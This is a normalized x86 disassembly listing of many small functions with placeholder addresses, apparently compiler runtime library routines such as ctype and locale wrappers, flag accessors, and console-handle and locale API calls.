sub_42bd3c
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bd58
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bd73
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bd8f
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bdaa
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bdc6
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bde1
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bdfd
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42be18
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42be31
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42be49
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42be62
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42be7a
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42be93
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_42bc56
add esp 0x10
pop ebp
retn
sub_42bf00
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_42beab
pop ecx
pop ecx
pop ebp
retn
sub_42bff6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_42bf20
add esp 0xc
pop ebp
retn 0x4
sub_42c029
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_437d45
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_42c05b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_42bf20
add esp 0xc
pop ebp
retn 0x8
sub_42c072
mov eax ecx
and [ eax ] 0x0
retn
sub_42c605
mov eax [ rw-data ]
not eax
and eax 0x1
retn
sub_42c610
mov eax [ rw-data ]
shr eax 0x1
not eax
and eax 0x1
retn
sub_42c61d
mov eax [ rw-data ]
shr eax 0x11
not eax
and eax 0x1
retn
sub_42c62b
mov eax [ rw-data ]
shr eax 0x2
not eax
and eax 0x1
retn
sub_42c639
mov eax [ rw-data ]
shr eax 0x3
not eax
and eax 0x1
retn
sub_42c647
mov eax [ rw-data ]
shr eax 0x4
not eax
and eax 0x1
retn
sub_42c655
mov eax [ rw-data ]
and eax 0x60
xor ecx ecx
cmp al 0x60
setne cl
mov eax ecx
retn
sub_42c667
mov eax [ rw-data ]
shr eax 0x7
not eax
and eax 0x1
retn
sub_42c675
mov eax [ rw-data ]
shr eax 0x8
not eax
and eax 0x1
retn
sub_42c683
mov eax [ rw-data ]
shr eax 0x9
not eax
and eax 0x1
retn
sub_42c691
mov eax [ rw-data ]
and eax 0x1000
retn
sub_42c69c
mov eax [ rw-data ]
and eax 0x2000
retn
sub_42c6a7
mov eax [ rw-data ]
and eax 0x4000
retn
sub_42c6b2
mov eax [ rw-data ]
shr eax 0xf
not eax
and eax 0x1
retn
sub_42c6c0
mov eax [ rw-data ]
and eax 0x10000
retn
sub_42c6cb
mov eax [ rw-data ]
shr eax 0x12
not eax
and eax 0x1
retn
sub_42c780
mov eax ecx
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
retn
sub_42c791
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_42c7a9
xor eax eax
cmp [ ecx + 0x4 ] 0x1
setle al
retn
sub_42c7b3
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_42c7bb
movsx eax [ ecx + 0x4 ]
retn
sub_42c7c0
mov eax ecx
or [ eax + 0x4 ] 0x100
retn
sub_42c7ca
mov eax [ ecx + 0x4 ]
shr eax 0x8
and eax 0x1
retn
sub_42c7d4
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x200
je r-xdata
inc eax
sub_42c7e5
cmp [ ecx ] 0x0
je r-xdata
retn
or [ ecx + 0x4 ] 0x200
sub_42c7f2
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x400
je r-xdata
inc eax
sub_42c803
or [ ecx + 0x4 ] 0x800
retn
sub_42c80b
mov eax [ ecx + 0x4 ]
shr eax 0xb
and eax 0x1
retn
sub_42c815
mov eax [ ecx + 0x4 ]
shr eax 0xc
and eax 0x1
retn
sub_42c81f
or [ ecx + 0x4 ] 0x1000
retn
sub_42c827
mov eax [ ecx + 0x4 ]
shr eax 0xd
and eax 0x1
retn
sub_42c831
or [ ecx + 0x4 ] 0x2000
retn
sub_42c839
mov eax [ ecx + 0x4 ]
shr eax 0xe
and eax 0x1
retn
sub_42c843
or [ ecx + 0x4 ] 0x4000
retn
sub_42c84b
mov eax [ ecx + 0x4 ]
shr eax 0xf
and eax 0x1
retn
sub_42c855
or [ ecx + 0x4 ] 0x8000
retn
sub_42c85d
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
jmp [ eax ]
xor eax eax
retn
sub_42c86a
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
jmp [ eax + 0x4 ]
xor al al
retn
sub_42c878
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_42c8af
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_42c8c7
xor eax eax
cmp [ ecx ] 0x9
sete al
retn
sub_42c8d0
mov eax ecx
or [ eax ] 0xffffffff
retn
sub_42c8d6
mov eax ecx
mov [ eax ] r--data
retn
sub_42c8df
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov cl [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_42c8f6
xor eax eax
inc eax
retn
sub_42c8fa
mov al [ ecx + 0x4 ]
retn
sub_42c8fe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop ebp
retn 0x8
mov cl [ ecx + 0x4 ]
mov [ eax ] cl
inc eax
sub_42c93f
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx ]
sub_42c9b2
mov eax [ ecx + 0x8 ]
retn
sub_42c9b6
cmp [ ecx + 0x4 ] 0x1
setne al
dec al
and al 0x20
retn
sub_42ca48
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
or [ eax + 0xc ] 0xffffffff
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_42cadc
xor eax eax
cmp [ ecx ] al
je r-xdata
retn
inc eax
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
sub_42cc0c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov ecx rw-data
push [ ebp + 0x8 ]
call sub_42c6f8
pop ebp
retn
sub_42cf0d
mov eax [ ecx + 0x8 ]
retn
sub_42cf11
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
xor al al
retn
mov ecx [ ecx + 0x4 ]
mov al [ ecx + eax - 0x1 ]
retn
sub_42cf23
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42cc23
add esp 0x10
pop ebp
retn 0x8
sub_42cf9a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42cb99
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_42df8a
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_42d7f3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42dfa0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_42d7f3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42dfb6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_42d7f3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42e607
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42dfcc
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f251
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42f170
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_4311ef
mov edi edi
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4310f6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_43120f
mov edi edi
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4310f6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_43122f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4310f6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_4312de
push 0x5
call sub_42b075
pop ecx
retn
sub_431378
push 0x5
call sub_42b075
pop ecx
retn
sub_431a3d
xor eax eax
retn
sub_431a40
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_437de0
sub_431b9f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431b5d
add esp 0x10
pop ebp
retn
sub_431bd8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_431a4b
pop ecx
pop ecx
pop ebp
retn
sub_431beb
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_431abf
pop ecx
pop ecx
pop ebp
retn
sub_4323a0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4322df
add esp 0x14
pop ebp
retn
sub_4338a7
mov eax [ rw-data ]
retn
sub_433b7b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_433b8d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_43708c
push ebx
call sub_43c95a
pop ecx
retn
sub_43718b
push ebx
call sub_43c95a
pop ecx
retn
sub_4372e3
push [ ebp + 0xc ]
call sub_429fd3
pop ecx
retn
sub_4372ed
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_433ba2
call sub_437263
add esp 0x14
pop ebp
retn
sub_43730d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_434827
call sub_437263
add esp 0x14
pop ebp
retn
sub_43732d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4355ef
call sub_437263
add esp 0x14
pop ebp
retn
sub_43734d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_433ba2
call sub_437263
add esp 0x14
pop ebp
retn
sub_43736c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_434827
call sub_437263
add esp 0x14
pop ebp
retn
sub_43738b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4355ef
call sub_437263
add esp 0x14
pop ebp
retn
sub_43746e
push 0x1
call sub_42b075
pop ecx
retn
sub_437767
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_4378b1
push 0x2
call sub_42664d
sub_437d19
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_437c50
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_437d64
call eax
retn
sub_437d67
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_43cf77
add esp 0xc
pop ebp
retn
sub_437d7d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_43cfa2
add esp 0x10
pop ebp
retn
sub_437d96
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_437d67
sub_437da1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_437d7d
sub_437dac
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_43d2a5
add esp 0xc
pop ebp
retn
sub_437dc2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_43d2d0
add esp 0x10
pop ebp
retn
sub_4383a5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
sbb eax eax
neg eax
pop ebp
retn
sub_4383b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x7f
pop ebp
retn
sub_43844a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_438640
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438598
add esp 0xc
pop ebp
retn
sub_438700
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438657
add esp 0xc
pop ebp
retn
sub_4387bf
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438717
add esp 0xc
pop ebp
retn
sub_438808
mov eax [ rw-data ]
retn
sub_438d8d
push [ ebp + 0x8 ]
call sub_43c95a
pop ecx
retn
sub_439023
push [ ebp + 0xc ]
call sub_429fd3
pop ecx
retn
sub_43902d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_438fbd
sub_4390f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_439da2
call sub_429e89
add eax 0x20
push eax
push 0x1
call sub_42a00f
pop ecx
pop ecx
retn
sub_439db5
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44220e
add esp 0xc
pop ebp
retn
sub_439dce
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44222b
add esp 0xc
pop ebp
retn
sub_439de7
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_44222b
add esp 0xc
pop ebp
retn
sub_439dff
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_442248
add esp 0xc
pop ebp
retn
sub_439e18
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_442248
add esp 0xc
pop ebp
retn
sub_439e5a
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_439f86
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_439e70
add esp 0x10
pop ebp
retn
sub_439fd8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_439fa0
pop ecx
pop ecx
pop ebp
retn
sub_439feb
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a001
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a017
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a02a
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a03d
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a050
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a063
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a076
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a089
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a09f
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a0b5
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a0c8
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a0db
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a0ee
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a101
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a117
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a12d
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a143
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a159
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a16f
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a185
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a198
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_43a1ab
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_43b12c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_43c627
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43c465
add esp 0x10
pop ebp
retn
sub_43c641
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43c465
add esp 0x10
pop ebp
retn
sub_43c65b
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43c465
add esp 0x10
pop ebp
retn
sub_43c675
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43c465
add esp 0x10
pop ebp
retn
sub_43c70e
push 0x3
call sub_42b075
pop ecx
retn
sub_43c951
push 0xa
call sub_42b075
pop ecx
retn
sub_43ca53
push 0xa
call sub_42b075
pop ecx
retn
sub_43cb11
push 0xb
call sub_42b075
pop ecx
retn
sub_43cd09
push esi
call sub_429fd3
pop ecx
retn
sub_43cd20
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_43c720
sub_43cd36
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_43c720
sub_43cfa2
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_43cd4c
add esp 0x14
pop ebp
retn
sub_43cfeb
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_43cd4c
add esp 0x14
pop ebp
retn
sub_43d2d0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_43d008
add esp 0x14
pop ebp
retn
sub_43d319
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_43d008
add esp 0x14
pop ebp
retn
sub_43d420
mov eax [ rw-data ]
retn
sub_43d426
mov eax rw-data
retn
sub_43d4b0
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_43d586
push 0xd
call sub_42b075
pop ecx
retn
sub_43d592
push 0xc
call sub_42b075
pop ecx
retn
sub_43d59b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43d4d9
sub_43d640
push 0xc
call sub_42b075
pop ecx
retn
sub_43d64c
push 0xd
call sub_42b075
pop ecx
retn
j_sub_43d5a6
jmp sub_43d5a6
sub_43d65a
xor eax eax
retn
sub_43e1f9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43e104
sub_43e336
push 0xc
call sub_42b075
pop ecx
retn
sub_43e342
push 0xc
call sub_42b075
pop ecx
retn
sub_43e373
and [ esi + 0x70 ] 0xffffffef
retn
sub_43e55d
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
pop ebp
retn
sub_4410d8
push 0x1f80
call sub_429061
pop ecx
retn
sub_4420e9
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441f94
add esp 0x14
pop ebp
retn
sub_442206
push esi
call sub_429fd3
pop ecx
retn
sub_44220e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_439106
call sub_442189
add esp 0x10
pop ebp
retn
sub_44222b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_43a312
call sub_442189
add esp 0x10
pop ebp
retn
sub_442248
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_43b141
call sub_442189
add esp 0x10
pop ebp
retn
sub_442265
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_439106
call sub_442189
add esp 0x10
pop ebp
retn
sub_442281
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_43a312
call sub_442189
add esp 0x10
pop ebp
retn
sub_44229d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_43b141
call sub_442189
add esp 0x10
pop ebp
retn
sub_44230e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4422b9
sub_442319
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
pop ebp
retn
sub_4424cd
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_4424ec
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_44265b
push ebx
call sub_43c95a
pop ecx
retn
sub_442a4b
call sub_426c39
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4294bb
sub_442a90
call sub_426c39
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4294bb
sub_442ab6
call sub_426c39
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4294bb
sub_442adc
call sub_426c39
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4294bb
sub_442b02
xor eax eax
retn
sub_442c28
or [ esi + 0x8 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] eax
retn
sub_443384
test eax eax
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
